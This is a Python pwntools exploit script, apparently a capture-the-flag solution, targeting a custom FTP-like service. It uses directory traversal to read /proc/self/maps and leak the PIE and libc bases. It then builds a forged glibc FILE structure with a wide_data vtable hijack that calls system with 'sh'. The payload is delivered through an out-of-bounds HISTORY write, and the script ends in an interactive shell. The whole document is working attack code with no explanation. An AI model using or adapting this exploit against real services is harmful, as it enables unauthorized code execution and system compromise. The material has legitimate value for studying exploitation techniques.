from pwn import *

context.log_level = 'debug'
REMOTE = False
if REMOTE:
    HOST, PORT = '13.125.218.86', 31887
else:
    HOST, PORT = 'localhost', 31887

io = remote(HOST, PORT)
def read_filename(filename):
    io.sendlineafter('ftp> ', f'READ {filename}')

def write_filename(filename, text):
    io.sendlineafter('ftp> ', f'WRITE {filename}')
    io.sendlineafter(':', text)

def cwd(directory):
    io.sendlineafter('ftp> ', f'CWD {directory}')

def write_history(idx, data):
    io.sendlineafter('ftp> ', 'HISTORY')
    io.sendlineafter(':', 'w')
    io.sendlineafter('?> ', str(idx))
    io.send(data)

write_filename('test', 'adsfEOF')
read_filename('test')
cwd('/')
read_filename('proc/self/maps')

io.recvline()
pie_base = int(io.recvline().split(b'-')[0], 16)
log.info(f'pie_base: {hex(pie_base)}')
for _ in range(6): io.recvline()
libc_base = int(io.recvline().split(b'-')[0], 16)
log.info(f'libc_base: {hex(libc_base)}')
_IO_wfile_jumps = libc_base + 0x2170c0
stdout = libc_base + 0x21b780
system = libc_base + 0x50d70
binsh = libc_base + 0x1d8678
payload = b"\x01\x01\x01\x01;sh;" # wide_data
# payload = b"/bin/sh\x00"
payload += p64(0)
payload += p64(system)
payload += p64(0) # wide_data->_IO_write_base == 0
payload += p64(0) # _IO_write_ptr
payload += p64(1) # _IO_write_end
payload += p64(0) # wide_data->_IO_buf_base == 0
payload += p64(0) # _IO_buf_end
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(pie_base + 0x50f0) # _lock
payload += p64(0xffffffffffffffff) # _offset
payload += p64(0) # _IO_save_end;
payload += p64(stdout) # _wide_data
payload += p64(0) # _IO_FILE
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(_IO_wfile_jumps) # vtable
payload += p64(stdout - 0x58) # vtable of wide_data
print(len(payload))
write_history(-4, payload)
io.interactive()